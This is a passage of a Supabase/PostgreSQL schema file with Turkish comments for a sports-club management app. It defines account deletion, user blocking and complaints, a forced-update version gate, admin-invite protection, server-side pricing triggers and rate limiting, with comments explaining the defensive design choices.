-- Yukarıdaki tek kolonlu indeksler kiracı duvarını karşılıyor ama liste
-- ekranlarının gerçek sorgusu iki koşullu. Bu üç indeks ikinci koşulu da kapsar.

-- 0024: sporcu ve grup listelerinin varsayılan sorgusu artık
--   `kulup_id = ? and aktif = true` biçiminde.
create index if not exists sporcular_kulup_aktif_idx on public.sporcular (kulup_id, aktif);
create index if not exists grup_kulup_aktif_idx      on public.grup      (kulup_id, aktif);

-- 0025: "sonucu girilmemiş geçmiş maçlar" ekranlarının açılış sorgusu
--   `where kulup_id = ? and tur = 'mac' and tarih < ? and sonuc is null`.
-- Kısmi indeks yalnızca sonucu bekleyen satırları tutar; sonuç girildiği anda
-- satır indeksten düşer, yani indeks sezon boyunca küçük kalır.
create index if not exists etkinlik_sonuc_bekleyen_idx
  on public.etkinlik (kulup_id, tarih desc)
  where tur = 'mac' and sonuc is null;


-- ===========================================================================
-- 15) REALTIME YAYINI
--     Kaynak: 0010
-- ===========================================================================
-- Chat ekranı açıkken postgres_changes INSERT event'ine konusma_id filtresiyle
-- abone olunuyor. `supabase_realtime` publication'ı Supabase projelerinde hazır
-- gelir; saf Postgres kurulumlarında olmayabileceği için varlığı kontrol ediliyor.
do $$
begin
  if exists (select 1 from pg_publication where pubname = 'supabase_realtime') then
    execute 'alter publication supabase_realtime add table mesaj';
  else
    raise notice 'supabase_realtime publication bulunamadı — mesaj tablosu realtime yayınına eklenmedi.';
  end if;
end
$$;



-- ===========================================================================
-- 17) MODERASYON, HESAP SİLME VE SÜRÜM KAPISI
--     Kaynak: 0029 (hesap silme + erişim kaldırma), 0030 (asgari sürüm),
--             0031 (engelleme + şikâyet)
-- ===========================================================================
-- Bu bölüm App Store zorunluluklarının karşılığıdır: 5.1.1(v) uygulama içinden
-- hesap silme, Guideline 1.2 kullanıcı engelleme + içerik şikâyeti. Ayrıca
-- zorunlu güncelleme kapısı (şema değiştiren migration sonrası eski sürümlerin
-- sessizce boş ekran göstermesini engeller) ve kulübün personel erişimini
-- kaldırma yetkisi burada.
drop policy if exists "profiles: yönetici personeli pasife alır" on public.profiles;
create policy "profiles: yönetici personeli pasife alır" on public.profiles for update
  using (
    private.current_profile_role() = 'yonetici'
    -- Yönetici kendini pasife alamaz: kulübü kilitlemenin en kolay yolu bu olurdu.
    and id <> auth.uid()
  )
  with check (
    private.current_profile_role() = 'yonetici'
    and id <> auth.uid()
  );


-- ===========================================================================
-- 5) public.hesabimi_sil()
-- ===========================================================================
-- Kullanıcının KENDİ hesabını silmesi. Parametre YOK — hedef her zaman
-- auth.uid(). Bu bilinçli: parametre alsaydı "başkasının hesabını sil" ucu
-- olurdu ve tek bir yetki hatası tüm kullanıcıları silinebilir yapardı.
--
-- SECURITY DEFINER gerekli çünkü:
--   · auth.users tablosuna normal kullanıcının yazma yetkisi yok,
--   · silinen satırlar (konuşmalar, bağlar) RLS altında kısmen görünmez.
-- Fonksiyon postgres olarak koştuğu için RLS'i baypas eder; bu yüzden gövdedeki
-- HER İFADE auth.uid() ile sınırlandırılmıştır.
--
-- NE SİLİNİR / NE KALIR
--   Silinir : giriş hesabı (auth.users), profil satırı, push cihaz kayıtları,
--             veli↔sporcu bağı, kişinin konuşmaları ve mesajları.
--   Kalır   : sporcu kaydı (kulübün kaydı), ödemeler ve yoklama (mali/hukuki
--             kayıt), hakediş ve rezervasyon geçmişi — bunlarda kişi bağı NULL'a
--             düşer. Bu ayrım KVKK'nın "saklama yükümlülüğü olan veri hariç"
--             istisnasının karşılığı.
--
-- REDDEDİLEN DURUM: kulübün son yöneticisi. Silinirse kulüp panelsiz kalır ve
-- kurtarma yolu yalnızca SQL olur; kullanıcıya ne yapması gerektiği söyleniyor.
create or replace function public.hesabimi_sil()
returns void
language plpgsql
security definer
set search_path = public
as $$
declare
  v_id    uuid := auth.uid();
  v_rol   app_role;
  v_kulup uuid;
  v_diger int;
begin
  if v_id is null then
    raise exception 'Oturum bulunamadı.';
  end if;

  select p.role, p.kulup_id into v_rol, v_kulup
    from public.profiles p where p.id = v_id;

  if v_rol is null then
    raise exception 'Profil bulunamadı.';
  end if;

  -- Son yönetici koruması.
  if v_rol = 'yonetici' then
    select count(*) into v_diger
      from public.profiles
     where role = 'yonetici' and kulup_id = v_kulup and aktif and id <> v_id;

    if v_diger = 0 then
      raise exception 'Kulübün tek yöneticisi olduğunuz için hesabınız silinemiyor. Önce başka bir yönetici davet edin, sonra tekrar deneyin.';
    end if;
  end if;

  -- --- Kişiye ait bağlar ---------------------------------------------------
  delete from public.push_token   where user_id = v_id;
  delete from public.veli_sporcu  where veli_id = v_id;
  delete from public.sporcu_antrenor where antrenor_id = v_id;
  -- Konuşmalar cascade ile mesajları da götürür (bölüm 1.1).
  delete from public.konusma where veli_id = v_id or antrenor_id = v_id;
  -- Kullanılmamış davetler denetim izi taşımıyor.
  delete from public.davet where olusturan_id = v_id and kullanildi_at is null;

  -- --- Kulübe ait kayıtlarda kişi bağını boşalt ----------------------------
  -- Bu satırlar FK'de zaten nullable; burada AÇIKÇA boşaltılıyorlar ki silme
  -- sırasının ne yaptığı fonksiyonun gövdesinden okunabilsin.
  -- ⚠ BU LİSTE ŞEMADAN DOĞRULANDI, tahminle yazılmadı. İlk yazımda antrenman ve
  -- mac_kadro da buradaydı; o tablolarda olusturan_id KOLONU YOK ve fonksiyon
  -- çalışma anında "column does not exist" ile patlıyordu. Yeni bir kişi bağı
  -- kolonu eklenirse buraya da eklenmeli, aksi halde silinen kullanıcı o
  -- tablodan FK ile geri bağlı kalır.
  update public.duyuru                 set olusturan_id = null where olusturan_id = v_id;
  update public.etkinlik               set olusturan_id = null where olusturan_id = v_id;
  update public.gider                  set olusturan_id = null where olusturan_id = v_id;
  update public.fatura                 set olusturan_id = null where olusturan_id = v_id;
  update public.basvuru                set created_by   = null where created_by   = v_id;
  update public.gelisim_degerlendirme  set antrenor_id  = null where antrenor_id  = v_id;
  update public.davet                  set olusturan_id = null where olusturan_id = v_id;

  -- --- BİLEREK SİLİNMEYEN: sporcular.veli_ad / veli_telefon / veli_yakinlik
  -- Çocuk kulübe kayıtlı olduğu sürece kulübün acil durumda ulaşabileceği bir
  -- iletişim bilgisine ihtiyacı var; velinin uygulama hesabını silmesi onun
  -- veli olmaktan çıkması demek değil. Bu alanlar kulübün kendi kaydıdır ve
  -- KVKK'nın saklama istisnası kapsamında değerlendirilir.
  -- Bu tercih kullanıcıya ACIKCA soyleniyor: src/components/HesabiSil.tsx
  -- icindeki "KULUPTE KALACAKLAR" listesinde ayri bir madde olarak yaziyor.
  -- Soylenmeseydi liste yaniltici olurdu — asil kusur silmemek degil,
  -- silinmedigini gizlemekti. Hukukcu gorusu aksini soylerse buraya uc
  -- update satiri eklenir.

  -- --- Giriş hesabı --------------------------------------------------------
  -- profiles satırı buradan cascade ile gider (profiles.id → auth.users(id)
  -- on delete cascade), hakediş/rezervasyon/paket bağları da bölüm 1'deki
  -- set null davranışıyla boşalır.
  --
  -- ⚠ MEVCUT BELİRTEÇ: silinen kullanıcının elindeki JWT süresi dolana kadar
  -- (varsayılan 1 saat) teknik olarak geçerlidir. Pratikte hiçbir şey göremez
  -- çünkü profiles satırı yok → current_kulup_id() NULL → kiracı duvarı kapalı.
  -- İstemci ayrıca signOut çağırıyor.
  delete from auth.users where id = v_id;
end;
$$;

-- Yalnızca oturum açmış kullanıcı çağırabilir. anon'a VERİLMEZ: kimliği
-- olmayan bir isteğin silecek bir hesabı yok, uç açıkta durmasın.
revoke execute on function public.hesabimi_sil() from public;
revoke execute on function public.hesabimi_sil() from anon;
grant  execute on function public.hesabimi_sil() to authenticated;




create table if not exists public.uygulama_surumu (
  -- id boolean/check(id) deseni: tabloda EN FAZLA BİR satır olabilir
  -- (kurum_ayarlari'ndaki aynı hile). İki satır olsaydı "hangisi geçerli"
  -- sorusu doğardı ve istemci rastgele birini okurdu.
  id             boolean primary key default true check (id),
  -- Bu sürümden ESKİ uygulamalar engellenir. Karşılaştırma semver mantığıyla
  -- yapılır (1.10.0 > 1.9.0), düz metin karşılaştırmasıyla değil.
  asgari_surum   text not null default '1.0.0',
  -- Kullanıcıya gösterilecek metin. Sebep her seferinde farklı olabildiği için
  -- (güvenlik yaması / veri yapısı değişikliği) sabit metin yerine alan.
  mesaj          text,
  ios_url        text,
  android_url    text,
  updated_at     timestamptz not null default now()
);

insert into public.uygulama_surumu (id, asgari_surum, mesaj)
values (true, '1.0.0', 'Uygulamanın yeni bir sürümü var. Devam etmek için güncelleyin.')
on conflict (id) do nothing;

comment on table public.uygulama_surumu is
  'Zorunlu güncelleme kapısı (0030). Tek satır. Platforma ait, kiracıya değil — kulup_id yok. Yazma yalnızca service_role.';
comment on column public.uygulama_surumu.asgari_surum is
  'Bu sürümden eski uygulamalar engellenir. app.json > expo.version ile karşılaştırılır (semver).';

alter table public.uygulama_surumu enable row level security;

-- Okuma herkese açık (yukarıdaki gerekçe). Yazma politikası YOK: politikası
-- olmayan işlem RLS altında reddedilir (fail-closed), yani anon/authenticated
-- bu tabloya yazamaz. service_role RLS'i baypas ettiği için süper-admin
-- konsolu değeri değiştirebilir.
drop policy if exists "uygulama_surumu: herkes okur" on public.uygulama_surumu;
create policy "uygulama_surumu: herkes okur" on public.uygulama_surumu for select using (true);

grant select on public.uygulama_surumu to anon, authenticated;

-- ===========================================================================
-- KULLANIM
--   -- Zorunlu güncellemeyi açmak (süper-admin, SQL Editor):
--   update public.uygulama_surumu
--      set asgari_surum = '1.2.0',
--          mesaj = 'Ödeme ekranı yenilendi; devam etmek için güncelleyin.',
--          updated_at = now();
--
--   ⚠ Değeri MAĞAZADAKİ sürüm yayınlandıktan SONRA yükselt. Önce yükseltirsen
--     kullanıcılar indirebilecekleri bir güncelleme olmadan kilitlenir.
-- ===========================================================================


create table if not exists public.engelleme (
  engelleyen_id uuid not null references public.profiles(id) on delete cascade,
  engellenen_id uuid not null references public.profiles(id) on delete cascade,
  created_at    timestamptz not null default now(),
  kulup_id      uuid not null default private.current_kulup_id() references public.kulup(id),
  primary key (engelleyen_id, engellenen_id),
  -- Kendini engellemek anlamsız; kontrolü veritabanına bırakmak, her istemci
  -- sürümünde tekrar hatırlamaktan güvenli.
  constraint engelleme_kendini_check check (engelleyen_id <> engellenen_id)
);

create index if not exists engelleme_engellenen_idx on public.engelleme (engellenen_id);
create index if not exists engelleme_kulup_id_idx   on public.engelleme (kulup_id);

-- ⚠ GRANT AÇIKÇA VERİLİYOR — YENİ TABLO KURAN HER MIGRATION BUNU YAPMALI.
-- kurulum/01_sema.sql'in sonundaki `grant all on all tables in schema public`
-- yalnızca O AN var olan tablolara uygulanır; sonradan gelen migration'ların
-- tabloları bu grant'ı ALMAZ. Sonuç, RLS'ten önce gelen ve teşhisi zor bir
-- hata: "permission denied for table engelleme" — politikalar doğru olsa bile.
-- (Bu tam olarak yaşandı: testte engelleme kaydı oluşturulamadı.)
-- İzinlerin gerçek daraltıcısı GRANT değil RLS'tir; 01_sema'daki aynı gerekçe.
grant all on public.engelleme to anon, authenticated, service_role;

alter table public.engelleme enable row level security;

-- Kiracı duvarı (0021 ŞABLON-A): `to` yan tümcesi YOK, fonksiyon select ile sarılı.
drop policy if exists "kulup izolasyonu" on public.engelleme;
create policy "kulup izolasyonu" on public.engelleme
  as restrictive for all
  using (kulup_id = (select private.current_kulup_id()))
  with check (kulup_id = (select private.current_kulup_id()));

-- Kullanıcı YALNIZCA kendi engellemelerini yönetir. Başkasının engel listesini
-- okumak da yazmak da mümkün değil.
drop policy if exists "engelleme: kendi listesini yönetir" on public.engelleme;
create policy "engelleme: kendi listesini yönetir" on public.engelleme for all
  using (engelleyen_id = auth.uid())
  with check (engelleyen_id = auth.uid());

-- ⚠ ÇİFT YÖNLÜ ETKİ İÇİN OKUMA GENİŞLETİLMİYOR.
-- "Beni kim engelledi" bilgisi kullanıcıya AÇILMIYOR: engellendiğini bilmek
-- çoğu üründe bilinçli olarak gizlenir. Engelin çift yönlü çalışması aşağıdaki
-- private.engel_var() fonksiyonuyla sağlanıyor — fonksiyon SECURITY DEFINER
-- olduğu için RLS'e takılmadan iki yönü de görebiliyor.


-- ===========================================================================
-- 2) private.engel_var() — mesaj politikalarının dayanağı
-- ===========================================================================
-- İki kullanıcı arasında HERHANGİ BİR yönde engel var mı?
--
-- SECURITY DEFINER: engelleme satırını yalnızca engelleyen okuyabiliyor (bölüm
-- 1). Politikanın içinden normal bir sorgu yazılsaydı, engellenen taraf için
-- satır GÖRÜNMEZ olur ve engel onun tarafında hiç uygulanmazdı — tam da
-- kaçınılmak istenen durum.
--
-- private şemasında: PostgREST yalnızca public'i yayımlar, bu fonksiyon
-- /rest/v1/rpc üzerinden çağrılamaz. Çağrılabilseydi "beni kim engelledi"
-- sorusunu yanıtlayan bir uç olurdu.
create or replace function private.engel_var(a uuid, b uuid)
returns boolean
language sql
stable
security definer
set search_path = public
as $$
  select exists (
    select 1 from public.engelleme e
     where (e.engelleyen_id = a and e.engellenen_id = b)
        or (e.engelleyen_id = b and e.engellenen_id = a)
  )
$$;

revoke execute on function private.engel_var(uuid, uuid) from public;
revoke execute on function private.engel_var(uuid, uuid) from anon;
-- authenticated'a EXECUTE veriliyor çünkü aşağıdaki RLS politikaları
-- kullanıcının kendi isteği içinde bu fonksiyonu çağırıyor.
grant execute on function private.engel_var(uuid, uuid) to authenticated;


-- ===========================================================================
-- 3) MESAJ YAZMAYI ENGELE BAĞLA
-- ===========================================================================
-- Mevcut "mesaj: katılımcı yazar" politikası yerine, aynı koşullara engel
-- kontrolü eklenmiş hali. Politika RESTRICTIVE değil PERMISSIVE olarak
-- değiştirilmiyor — var olanın yerine geçiyor ki mantık tek yerde kalsın.
drop policy if exists "mesaj: katılımcı yazar" on public.mesaj;
create policy "mesaj: katılımcı yazar" on public.mesaj for insert
  with check (
    gonderen_id = auth.uid()
    and exists (
      select 1 from public.konusma k
       where k.id = mesaj.konusma_id
         and (k.veli_id = auth.uid() or k.antrenor_id = auth.uid())
         -- Taraflardan biri diğerini engellediyse yazma reddedilir.
         and not private.engel_var(k.veli_id, k.antrenor_id)
    )
  );


-- ===========================================================================
-- 4) sikayet
-- ===========================================================================
-- Şikâyet KULÜP YÖNETİCİSİNE düşer, platforma değil: içeriği bilen, tarafları
-- tanıyan ve yaptırım uygulayabilecek olan kulüptür (antrenörü uyarabilir,
-- erişimini kaldırabilir — 0029). Apple'ın istediği "zamanında yanıt" da bu
-- şekilde gerçek bir sürece bağlanıyor.
create table if not exists public.sikayet (
  id             uuid primary key default gen_random_uuid(),
  sikayet_eden_id uuid not null references public.profiles(id) on delete cascade,
  -- Şikâyet edilen kişi silinirse şikâyet kaydı DURUR (denetim izi), bağ boşalır.
  hedef_id       uuid references public.profiles(id) on delete set null,
  konusma_id     uuid references public.konusma(id) on delete set null,
  sebep          text not null check (sebep in ('uygunsuz_icerik', 'taciz', 'spam', 'sahte_hesap', 'diger')),
  aciklama       text,
  durum          text not null default 'acik' check (durum in ('acik', 'incelendi', 'kapatildi')),
  yonetici_notu  text,
  created_at     timestamptz not null default now(),
  kulup_id       uuid not null default private.current_kulup_id() references public.kulup(id)
);

create index if not exists sikayet_kulup_durum_idx on public.sikayet (kulup_id, durum);

-- Yukarıdaki aynı gerekçe.
grant all on public.sikayet to anon, authenticated, service_role;

alter table public.sikayet enable row level security;

drop policy if exists "kulup izolasyonu" on public.sikayet;
create policy "kulup izolasyonu" on public.sikayet
  as restrictive for all
  using (kulup_id = (select private.current_kulup_id()))
  with check (kulup_id = (select private.current_kulup_id()));

-- Kullanıcı şikâyet OLUŞTURUR ve yalnızca KENDİ şikâyetlerini görür.
-- Güncelleme yetkisi YOK: şikâyeti açan kişi durumunu değiştiremesin.
drop policy if exists "sikayet: kullanıcı kendi şikâyetini açar" on public.sikayet;
create policy "sikayet: kullanıcı kendi şikâyetini açar" on public.sikayet for insert
  with check (sikayet_eden_id = auth.uid());

drop policy if exists "sikayet: kullanıcı kendi şikâyetini görür" on public.sikayet;
create policy "sikayet: kullanıcı kendi şikâyetini görür" on public.sikayet for select
  using (sikayet_eden_id = auth.uid());

-- Yönetici kulübün tüm şikâyetlerini görür ve durumunu günceller.
drop policy if exists "sikayet: yönetici yönetir" on public.sikayet;
create policy "sikayet: yönetici yönetir" on public.sikayet for select
  using (private.current_profile_role() = 'yonetici');

drop policy if exists "sikayet: yönetici günceller" on public.sikayet;
create policy "sikayet: yönetici günceller" on public.sikayet for update
  using (private.current_profile_role() = 'yonetici')
  with check (private.current_profile_role() = 'yonetici');


-- ===========================================================================
-- 5) DOĞRULAMA
-- ===========================================================================
--   -- Engel iki yönde de yazmayı durduruyor mu?
--   insert into public.engelleme (engelleyen_id, engellenen_id) values ('<A>','<B>');
--   -- B oturumunda A ile olan konuşmaya mesaj yazmayı dene → RLS reddetmeli.
--
--   -- Politika sayıları: engelleme 2 (1 restrictive + 1 permissive),
--   -- sikayet 5 (1 restrictive + 4 permissive)
--   select tablename, count(*) from pg_policies
--    where schemaname='public' and tablename in ('engelleme','sikayet')
--    group by tablename;
-- ===========================================================================




-- ===========================================================================
-- 19) YONETICI KONTROLU VE KULUP BASVURUSU
--     Kaynak: 0034
-- ===========================================================================
-- Yonetici hesabi acmanin tek yolu platform konsolu. Kayit olan hic kimse
-- yonetici olamaz (handle_new_user davetsiz kaydi her zaman veli acar) ve
-- kulubun kendi yoneticisi de yeni yonetici davet edemez.

create or replace function public.protect_yonetici_daveti()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_kilitli    boolean;
  v_olusturan  app_role;
begin
  if new.rol <> 'yonetici' then
    return new;   -- antrenör/muhasebeci/veli daveti serbest
  end if;

  select k.yonetici_davet_kilitli into v_kilitli
    from public.kulup k where k.id = new.kulup_id;

  if coalesce(v_kilitli, true) = false then
    return new;   -- bu kulüp için kilit açılmış
  end if;

  -- YETKİ SATIRDAN OKUNUYOR (0034'teki hatanın düzeltmesi).
  -- Fonksiyon SECURITY DEFINER olduğu için profiles'ı RLS'e takılmadan okur;
  -- bu şart, çünkü kulüp yöneticisi platform_admin satırını göremez.
  select p.role into v_olusturan
    from public.profiles p where p.id = new.olusturan_id;

  if v_olusturan = 'platform_admin' then
    return new;
  end if;

  raise exception 'Yönetici hesapları yalnızca yazılım sağlayıcısı tarafından açılabilir. Yeni yönetici için sağlayıcınızla iletişime geçin.'
    using errcode = 'insufficient_privilege';
end;
$$;

drop trigger if exists on_davet_yonetici_kontrol on public.davet;
create trigger on_davet_yonetici_kontrol
  before insert on public.davet
  for each row execute procedure public.protect_yonetici_daveti();


-- ===========================================================================
-- 2) KULÜP BAŞVURUSU — "e-postanı ver, ben açayım"
-- ===========================================================================
-- Bugün yeni kulüp açmanın tek yolu, platform konsolundaki formu Yavuz'un elle
-- doldurması. Talep eden kişinin bilgisi hiçbir yerde tutulmuyor: WhatsApp'ta,
-- e-postada ya da akılda kalıyor. Bu tablo talebi kayda alıyor ve konsolda
-- "onayla" akışına bağlıyor.
--
-- PLATFORMA AİT, KİRACIYA DEĞİL: başvuru henüz bir kulübe ait değil (kulüp
-- ONAY SONRASI doğuyor). Bu yüzden kulup_id YOK ve 0021'in restrictive kiracı
-- duvarına dahil değil.
create table if not exists public.kulup_basvurusu (
  id           uuid primary key default gen_random_uuid(),
  kulup_adi    text not null,
  ad_soyad     text not null,
  eposta       text not null,
  telefon      text,
  sehir        text,
  not_metni    text,
  durum        text not null default 'yeni' check (durum in ('yeni', 'gorusuldu', 'onaylandi', 'reddedildi')),
  -- Onaylanınca açılan kulüp. Başvuru ile kulüp arasındaki iz.
  kulup_id     uuid references public.kulup(id) on delete set null,
  platform_notu text,
  created_at   timestamptz not null default now()
);

create index if not exists kulup_basvurusu_durum_idx on public.kulup_basvurusu (durum, created_at desc);

-- ⚠ YENİ TABLO KURAN HER MIGRATION KENDİ GRANT'İNİ VERMELİ (0031'de öğrenildi):
-- 01_sema sonundaki toplu grant yalnızca o an var olan tablolara uygulanır.
grant all on public.kulup_basvurusu to anon, authenticated, service_role;

alter table public.kulup_basvurusu enable row level security;

-- YAZMA HERKESE AÇIK, OKUMA HİÇ KİMSEYE.
--   Başvuru formu tanıtım sitesine konulabilsin diye anon INSERT açık. Ama
--   SELECT politikası YOK: politikası olmayan işlem RLS altında reddedilir,
--   yani ne anon ne authenticated bu tabloyu OKUYAMAZ. Okuyabilseydi tablo
--   rakiplerin müşteri adaylarını toplayabileceği bir listeye dönerdi.
--   Platform konsolu service_role ile okuyor; service_role RLS'i baypas eder.
drop policy if exists "kulup_basvurusu: herkes başvuru gönderir" on public.kulup_basvurusu;
create policy "kulup_basvurusu: herkes başvuru gönderir" on public.kulup_basvurusu for insert
  with check (true);

-- Hız sınırı (0032): açık bir uç, spam'e karşı korunmalı. Kimlik olmadığı için
-- IP'ye göre sayılıyor — bu, kimliksiz isteklerde IP'nin doğru araç olduğu
-- ender durumlardan biri.
create or replace function public.hiz_kulup_basvurusu()
returns trigger language plpgsql security definer set search_path = public as $$
begin
  perform private.hiz_kontrol('kulup_basvurusu', 3, interval '1 hour',
    'Kısa sürede çok fazla başvuru gönderildi. Lütfen bir süre sonra tekrar deneyin.');
  return new;
end $$;

drop trigger if exists on_kulup_basvurusu_hiz on public.kulup_basvurusu;
create trigger on_kulup_basvurusu_hiz before insert on public.kulup_basvurusu
  for each row execute procedure public.hiz_kulup_basvurusu();





-- ===========================================================================
-- 20) PARA TUTARLARI SUNUCUDA BELIRLENIR
--     Kaynak: 0036
-- ===========================================================================
-- Siparis tutari ve bireysel ders ucreti ISTEMCIDE hesaplanip yaziliyordu; RLS
-- yalnizca sahiplige bakiyor, tutara bakmiyordu. Degistirilmis bir istemci
-- 'birim_fiyat: 0.01' gonderip siparisi bedavaya getirebilirdi ve odeme
-- havale/EFT oldugu icin kulup tahsilati DOGRUDAN bu rakamdan yapiliyor.
-- Tetikleyiciler tutari DOGRULAMIYOR, yetkili kaynaktan UZERINE YAZIYOR.

create or replace function public.siparis_kalem_fiyatla()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_fiyat numeric;
begin
  select u.fiyat into v_fiyat
    from public.urun u where u.id = new.urun_id;

  if v_fiyat is null then
    raise exception 'Ürün bulunamadı.';
  end if;

  -- AKTİFLİK KONTROLÜ BURADA DEĞİL, RLS POLİTİKASINDA.
  -- İki kez yanlış yere konuldu, ikisi de sessizce çalışmadı:
  --   · current_user = 'authenticated' → bu fonksiyon SECURITY DEFINER, gövdede
  --     current_user ÇAĞIRANI DEĞİL SAHİBİNİ (postgres) verir; koşul hiç tutmadı.
  --   · auth.uid() is not null → demo/seed dosyaları kiracı bağlamı kurabilmek
  --     için kasten bir yönetici kimliği set ediyor; orada da auth.uid() dolu.
  -- Doğru ayrım "kim çağırdı" değil, KURALIN CİNSİ:
  --   · fiyatın üründen yazılması bir GÜVENLİK DEĞİŞMEZİdir → herkese uygulanır,
  --     yeri tetikleyicidir (aşağıda).
  --   · "pasif ürün sipariş edilemez" bir İŞ KURALIdır → yalnızca gerçek
  --     kullanıcıya uygulanmalı, yeri RLS politikasıdır. RLS zaten postgres ve
  --     service_role için baypas edilir, yani seed ve veri taşıma etkilenmez.

  -- İSTEMCİNİN GÖNDERDİĞİ DEĞER YOK SAYILIYOR.
  new.birim_fiyat := v_fiyat;
  return new;
end;
$$;

drop trigger if exists on_siparis_kalem_fiyatla on public.siparis_kalem;
create trigger on_siparis_kalem_fiyatla
  before insert or update on public.siparis_kalem
  for each row execute procedure public.siparis_kalem_fiyatla();


-- ===========================================================================
-- 2) siparis.tutar — KALEMLERDEN TÜRETİLİR
-- ===========================================================================
-- Sipariş satırı kalemlerden ÖNCE yazıldığı için tutar insert anında
-- hesaplanamaz; sıfırlanıp kalemler geldikçe güncelleniyor.
create or replace function public.siparis_tutar_sifirla()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
begin
  -- INSERT: kalem yok, tutar 0. UPDATE: kalemlerden yeniden hesapla —
  -- böylece istemcinin doğrudan `update siparis set tutar = 1` denemesi de
  -- etkisiz kalıyor.
  select coalesce(sum(sk.adet * sk.birim_fiyat), 0) into new.tutar
    from public.siparis_kalem sk where sk.siparis_id = new.id;
  return new;
end;
$$;

drop trigger if exists on_siparis_tutar on public.siparis;
create trigger on_siparis_tutar
  before insert or update on public.siparis
  for each row execute procedure public.siparis_tutar_sifirla();

-- Kalem eklendiğinde/değiştiğinde/silindiğinde başlık tutarını tazele.
create or replace function public.siparis_tutar_tazele()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_siparis uuid := coalesce(new.siparis_id, old.siparis_id);
begin
  -- Bu UPDATE, siparis üzerindeki BEFORE UPDATE tetikleyicisini çalıştırır ve
  -- o da tutarı kalemlerden hesaplar. Döngü yok: siparis tetikleyicisi
  -- siparis_kalem'e yazmıyor.
  update public.siparis set tutar = 0 where id = v_siparis;
  return null;   -- AFTER trigger, dönüş değeri kullanılmıyor
end;
$$;

drop trigger if exists on_siparis_kalem_tutar on public.siparis_kalem;
create trigger on_siparis_kalem_tutar
  after insert or update or delete on public.siparis_kalem
  for each row execute procedure public.siparis_tutar_tazele();


-- ===========================================================================
-- 3) bireysel_rezervasyon.tutar — ANTRENÖRÜN İLAN ETTİĞİ ÜCRETTEN
-- ===========================================================================
create or replace function public.rezervasyon_fiyatla()
returns trigger
language plpgsql
security definer
set search_path = public
as $$
declare
  v_tek    numeric;
  v_paket  numeric;
  v_adet   int;
begin
  -- 0029'dan sonra antrenor_id NULL olabiliyor (antrenör hesabı silinince
  -- `on delete set null`). O UPDATE geldiğinde ücret yeniden hesaplanamaz ve
  -- hesaplanmamalı da: geçmiş rezervasyonun tutarı olduğu gibi kalmalı.
  if new.antrenor_id is null then
    return new;
  end if;

  -- Yalnızca tutarı etkileyen alanlar değiştiğinde yeniden hesapla. Durum
  -- güncellemeleri (onayla/reddet/tamamlandi) tutara dokunmasın — antrenörün
  -- ilan ettiği ücret sonradan değişse bile geçmiş rezervasyon etkilenmemeli
  -- (sipariş satırındaki aynı "sözleşme" mantığı).
  if TG_OP = 'UPDATE'
     and new.antrenor_id is not distinct from old.antrenor_id
     and new.odeme_tipi  is not distinct from old.odeme_tipi
     and new.tutar       is not distinct from old.tutar then
    return new;
  end if;

  select ba.tek_fiyat, ba.paket_fiyat, ba.paket_ders_sayisi
    into v_tek, v_paket, v_adet
    from public.bireysel_antrenor ba
   where ba.antrenor_id = new.antrenor_id;

  if v_tek is null then
    raise exception 'Bu antrenörün bireysel ders ücreti tanımlı değil.';
  end if;

  -- İSTEMCİNİN GÖNDERDİĞİ DEĞER YOK SAYILIYOR.
  if new.odeme_tipi = 'paket' then
    -- Paket dersinin birim maliyeti. nullif ile sıfıra bölme korunuyor:
    -- paket_ders_sayisi 0 olsaydı sorgu hata verirdi.
    new.tutar := round(v_paket / nullif(v_adet, 0));
  else
    new.tutar := v_tek;
  end if;

  return new;
end;
$$;

drop trigger if exists on_rezervasyon_fiyatla on public.bireysel_rezervasyon;
create trigger on_rezervasyon_fiyatla
  before insert or update on public.bireysel_rezervasyon
  for each row execute procedure public.rezervasyon_fiyatla();




-- ===========================================================================
-- 18) HIZ SINIRI (kötüye kullanım koruması)
--     Kaynak: 0032
-- ===========================================================================
-- Kayıt/giriş istekleri Supabase Auth'a gider, bu tetikleyicilerden GEÇMEZ —
-- onların IP sınırı config.toml [auth.rate_limit] / Dashboard > Rate Limits.
-- Buradaki sınırlar oturum açmış kullanıcının PostgREST üzerinden yaptığı
-- YAZMA işlemleri içindir. Kimlik varsa auth.uid()'e, yoksa IP'ye göre
-- sayılır: bir kulübün tüm personeli aynı ofis Wi-Fi'ında olabilir ve saf IP
-- sınırı kötü niyetli tek kullanıcı yüzünden hepsini cezalandırırdı.
create table if not exists private.istek_sayaci (
  anahtar    text        not null,   -- '<eylem>:<kimlik>'
  pencere    timestamptz not null,   -- pencerenin başlangıcı
  adet       int         not null default 0,
  primary key (anahtar, pencere)
);

-- Eski pencereleri temizlemek için: fırsatçı silme (bölüm 2) bu indeksi kullanır.
create index if not exists istek_sayaci_pencere_idx on private.istek_sayaci (pencere);


-- ===========================================================================
-- 2) KİMLİK VE KONTROL
-- ===========================================================================
-- İstek sahibinin kimliği. Sırayla:
--   1) auth.uid()  — oturum açmışsa. Tercih edilen yol (yukarıdaki NAT gerekçesi).
--   2) IP          — PostgREST'in ilettiği başlıklardan.
--   3) 'bilinmeyen' — ikisi de yoksa. Bu durumda tüm kimliksiz istekler tek
--      kovaya düşer; kasıtlı olarak katı, çünkü kimliksiz yazma zaten olmamalı.
--
-- x-forwarded-for VİRGÜLLE AYRILMIŞ ZİNCİR olabilir (istemci, vekil1, vekil2...).
-- İLK değer istemcinin iddia ettiği adrestir ve ara vekiller ekleme yapar.
-- Supabase'in kendi vekili zinciri kendisi yazdığı için ilk değeri almak burada
-- doğru; doğrudan internete açık bir sunucuda bu alan taklit edilebilirdi.
create or replace function private.istek_kimligi()
returns text
language plpgsql
stable
security definer
set search_path = public
as $$
declare
  v_uid uuid := auth.uid();
  v_ham text;
begin
  if v_uid is not null then
    return 'u:' || v_uid::text;
  end if;

  -- request.headers yalnızca PostgREST üzerinden gelen isteklerde vardır;
  -- GoTrue veya doğrudan SQL bağlantılarında yoktur (bkz. başlıktaki uyarı).
  begin
    v_ham := current_setting('request.headers', true)::json ->> 'x-forwarded-for';
  exception when others then
    v_ham := null;
  end;

  if v_ham is null or btrim(v_ham) = '' then
    return 'bilinmeyen';
  end if;

  return 'ip:' || btrim(split_part(v_ham, ',', 1));
end;
$$;

-- Sayaç artırır; sınır aşıldıysa EXCEPTION atar.
--
